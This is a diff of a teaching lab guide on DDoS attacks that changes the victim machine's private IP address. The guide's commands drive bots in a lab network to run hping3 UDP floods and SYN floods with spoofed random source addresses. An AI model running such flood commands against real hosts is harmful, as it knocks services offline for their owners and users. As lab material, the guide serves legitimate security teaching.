@@ -58,7 +58,7 @@ In this lab, you will:
 
     Victim machine: target of the DDoS attacks.
 
-    IP: 192.168.10.130
+    IP: 192.168.10.112
 
     Hosted on machine 192.168.10.22\
 
@@ -77,7 +77,7 @@ In this lab, you will:
 
     In CnC machine, goto DDoS\_Lab4 folder and run:
 
-    | #./ping\_web.sh 192.168.10.130 |
+    | #./ping\_web.sh 192.168.10.112 |
     | ------------------------------ |
 
     Then the terminal will continuously check the response time of the victim machine.\
@@ -92,7 +92,7 @@ In this lab, you will:
 
     This will show available bots.
 
-    | #pssh -h bots.txt -P -t30 'sleep 1; hping3 --udp -d 10000 -p 80 --flood 192.168.10.130 & sleep 10; pkill hping3' |
+    | #pssh -h bots.txt -P -t30 'sleep 1; hping3 --udp -d 10000 -p 80 --flood 192.168.10.112 & sleep 10; pkill hping3' |
     | ---------------------------------------------------------------------------------------------------------------- |
 
 
@@ -118,7 +118,7 @@ In this lab, you will:
 
     Then in the bot shell, where “root@bot\~#” shows, run
 
-    | #hping3 -V -c 10 -d 120 -S -w 64 -p 80 -i u10000 --rand-source 192.168.10.130 |
+    | #hping3 -V -c 10 -d 120 -S -w 64 -p 80 -i u10000 --rand-source 192.168.10.112 |
     | ----------------------------------------------------------------------------- |
 
     * \-V :enable verbose output
